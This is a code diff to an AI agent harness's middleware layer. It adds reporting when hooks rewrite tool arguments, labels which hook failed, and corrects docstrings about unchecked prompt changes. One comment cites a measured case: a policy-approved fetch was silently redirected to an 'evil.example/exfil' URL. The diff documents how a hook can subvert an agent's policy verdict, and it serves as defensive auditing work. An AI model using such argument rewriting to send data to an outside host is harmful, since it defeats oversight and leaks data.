@@ -59,6 +59,7 @@ from dataclasses import replace
 from typing import TYPE_CHECKING, Any, Iterator, Mapping, Sequence
 
 from ._value import value
+from .credentials import resolve_provider
 from .errors import HarnessError
 from .models.base import ModelRequest, ModelResponse
 
@@ -89,20 +90,30 @@ _CURRENT: contextvars.ContextVar[RunIdentity] = contextvars.ContextVar(
     "harness_middleware_identity", default=_EMPTY_IDENTITY)
 
 
+#: Where an argument rewrite gets reported. A callable rather than the `EventBus`
+#: itself: this module sits above `observe` in the layering and must not learn its
+#: types to make a record (the `EgressPolicy`-shaped mistake of a low layer importing
+#: a high one). `Agent` sets it for the run; nothing set means nothing to tell.
+_AMEND: contextvars.ContextVar[Any] = contextvars.ContextVar(
+    "harness_middleware_amend", default=None)
+
+
 def _identity() -> RunIdentity:
     return _CURRENT.get()
 
 
 @contextlib.contextmanager
 def _run_scope(*, run_id: str, session_id: str | None,
-               tenant_id: str | None) -> Iterator[None]:
+               tenant_id: str | None, on_amend: Any = None) -> Iterator[None]:
     """Entered once, by `Agent`, around the whole run — classic (`atry_run`) or durable
     (`_atry_run_durable`). Not part of the public API."""
     token = _CURRENT.set(RunIdentity(run_id=run_id, session_id=session_id,
                                      tenant_id=tenant_id))
+    amend_token = _AMEND.set(on_amend)
     try:
         yield
     finally:
+        _AMEND.reset(amend_token)
         _CURRENT.reset(token)
 
 
@@ -182,7 +193,20 @@ class MiddlewareHookError(HarnessError):
     its generic `except Exception:`, skips the remaining retry attempts regardless of
     the tool's own effect class, and tags the resulting event `where="middleware"` with
     a message that says a hook broke, not that the tool did.
+
+    It also carries WHICH hook failed, because the two answer opposite questions about
+    whether the tool ran and both engines have to record the answer. `before_tool`
+    raising means `fn()` never executed; `after_tool` raising means it executed and, for
+    a `write`/`danger` tool, its side effect has already landed. `Result.tools_run`
+    records what EXECUTED (IDL-49), so guessing here is not neutral: guess "did not run"
+    and a `wipe` that ran passes `assert_no_tool`, whose whole job is to prove it did
+    not.
     """
+
+    def __init__(self, message: str, hook: str = "") -> None:
+        super().__init__(message)
+        #: `"before_tool"` or `"after_tool"`; empty only from an older caller.
+        self.hook = hook
 
 
 class Middleware:
@@ -196,10 +220,43 @@ class Middleware:
     def before_model(self, call: ModelCall) -> ModelRequest:
         """Immediately before the provider is called. Return `call.request` unchanged,
         or a replacement (`dataclasses.replace(call.request, ...)`) — e.g. to inject
-        content or swap the model. Changing `system`/`tools` differently between
-        otherwise identical calls trips the cache-determinism linter
-        (`context/linter.py`, `NonDeterministicPromptError`); mutate `messages`, not
-        structure, unless the cache break is intended.
+        content or swap the model. Mutate `messages`, not structure.
+
+        **Nothing here is checked, and an earlier version of this docstring said
+        otherwise.** It claimed that varying `system`/`tools` between otherwise
+        identical calls "trips the cache-determinism linter
+        (`context/linter.py`, `NonDeterministicPromptError`)". It does not, and the
+        claim was measured false: a middleware rewriting `request.system` on every call
+        completes a run with no error at all. `PrefixWatcher.observe` is called from
+        exactly one site (`run.py`, once per step) with the ASSEMBLER's own
+        `render_prefix()` — bytes that never pass through a middleware — so the linter
+        cannot see anything a hook here does. A control that is specified and never
+        executed is not a control (R-16), so it is described as absent rather than
+        implied.
+
+        What that leaves you responsible for, all of it real:
+
+        * **Prompt caching.** Varying `system`/`tools` per call invalidates the cached
+          prefix silently — no error, just a bill that stops falling.
+        * **The budget CEILING, though not the accounting.** The pre-flight count runs
+          on a probe the assembler builds (`run.py`), and `reserve()`'s `hard_max_input`
+          comes from that same pre-middleware request, while `_MiddlewareProvider.
+          count_input_tokens` delegates straight through without running any hook. So
+          content injected here is unseen by both — measured once at 33 chars counted
+          against 5064 the provider received. `settle()` still bills `resp.usage`, the
+          provider's real numbers, so spend is not hidden; what breaks is the ceiling.
+          Sharper still: when `hard_max_input` fits, `reserve()` records `exact=True` and
+          the run emits `BUDGET_RESERVED(exact=True)` — an injection makes the transcript
+          positively assert a bound that is false. Keep anything added here small and
+          bounded, and put anything large in a tool result, which is counted normally.
+        * **Window management.** `context/window.manage` measures `msgs`, which never
+          contains what a hook added.
+
+        Making the linter cover this is not a docstring away: `_MiddlewareProvider` is
+        built once in `with_middleware()` and stored on a frozen `Agent` that is shared
+        across concurrent runs, so it has nowhere per-run to keep a watcher — the same
+        constraint that makes `PrefixWatcher`, `Ledger` and `TaintTracker` per-run
+        objects (ADR-079).
         """
         return call.request
 
@@ -215,6 +272,15 @@ class Middleware:
         denied. Return `call.kwargs` (unchanged or modified), or raise
         `ShortCircuit(result)` to skip the tool's own function and use `result`
         instead.
+
+        **Returning modified kwargs changes the call the verdict was about.** The hook
+        cannot reach a call `Policy` denied, so it cannot bypass a verdict — but it can
+        change the subject of one, and that is a trust boundary rather than a detail:
+        a middleware is as privileged as the policy set. Every rewrite emits
+        `tool.arguments_amended` naming this class, so "what was approved" and "what ran"
+        stay two comparable facts in the transcript instead of one that quietly changed.
+        docs/02 §4 said stacking hooks "can only add restriction or observation, never
+        bypass one"; the parenthetical was right and the conclusion was not.
 
         Fires once per RETRY attempt, not once per logical call: a `read`/`external`
         tool gets up to `MAX_ATTEMPTS` tries on failure (`dispatch.py`/`lg/runtime.py`,
@@ -259,10 +325,15 @@ def with_middleware(agent: "Agent", *middlewares: Middleware) -> "Agent":
     """
     if not middlewares:
         return agent
-    provider = agent.provider
-    if provider is None:
-        from .models.anthropic import AnthropicProvider
-        provider = AnthropicProvider()
+    # `resolve_provider`, not a fourth copy of "build the default provider". It exists
+    # so the classic and durable paths could not drift; this was a third site that had
+    # drifted anyway, and the drift was visible: with no key configured,
+    # `with_middleware()` produced a live agent that failed mid-run with
+    # `ProviderError: TypeError: "Could not resolve authentication method..."`, where
+    # the same agent unwrapped raises `ConfigError: ... Run: harness setup` (ADR-086).
+    # Imported at MODULE level now: it lives in `credentials`, so reaching it no longer
+    # means reaching back into `agent.py`, which imports this module (ADR-098).
+    provider = resolve_provider(agent.provider)
     return agent.with_(
         provider=_MiddlewareProvider(provider, middlewares),
         tools=[_wrap_tool(t, middlewares) for t in agent.toolset],
@@ -325,8 +396,10 @@ def _wrap_tool(spec: "ToolSpec", middlewares: Sequence[Middleware]) -> "ToolSpec
     @functools.wraps(fn)
     async def wrapped(**kwargs: Any) -> Any:
         identity = _identity()
+        amend = _AMEND.get()
         for mw in middlewares:
             try:
+                before = kwargs
                 kwargs = dict(mw.before_tool(ToolInvocation(name, kwargs, identity=identity)))
             except ShortCircuit as sc:
                 return sc.result
@@ -334,8 +407,20 @@ def _wrap_tool(spec: "ToolSpec", middlewares: Sequence[Middleware]) -> "ToolSpec
                 # G-17: a bug in the OPERATOR's own before_tool, not the tool — never
                 # let it look like fn() failed. fn() hasn't even run yet this attempt.
                 raise MiddlewareHookError(
-                    f"{type(mw).__name__}.before_tool raised for tool {name!r}: {exc}"
-                ) from exc
+                    f"{type(mw).__name__}.before_tool raised for tool {name!r}: {exc}",
+                    hook="before_tool") from exc
+            # ADR-109. A hook cannot bypass the VERDICT — it never sees a call `Policy`
+            # denied — but it can change the call the verdict was about, and until this
+            # existed the transcript then positively asserted an argument set that never
+            # ran. Measured: `policy.decided fetch ALLOW` for
+            # `{"url": "http://docs.python.org/x"}` while the tool was called with
+            # `http://evil.example/exfil`. Reporting it does not stop it; a rewrite is a
+            # documented, useful power (redaction, defaulting). Silence was the defect.
+            #
+            # Reached only when `before_tool` RETURNED. G-17's wrapper above re-raises,
+            # so a hook that threw never gets here — which is right: it amended nothing.
+            if amend is not None and kwargs != before:
+                amend(name, type(mw).__name__, before, kwargs)
         result = await fn(**kwargs)
         for mw in middlewares:
             try:
@@ -345,8 +430,8 @@ def _wrap_tool(spec: "ToolSpec", middlewares: Sequence[Middleware]) -> "ToolSpec
                 # already had its real side effect) — the failure is the HOOK's, not a
                 # reason to treat this call as though the tool itself failed.
                 raise MiddlewareHookError(
-                    f"{type(mw).__name__}.after_tool raised for tool {name!r}: {exc}"
-                ) from exc
+                    f"{type(mw).__name__}.after_tool raised for tool {name!r}: {exc}",
+                    hook="after_tool") from exc
         return result
 
     return replace(spec, fn=wrapped)
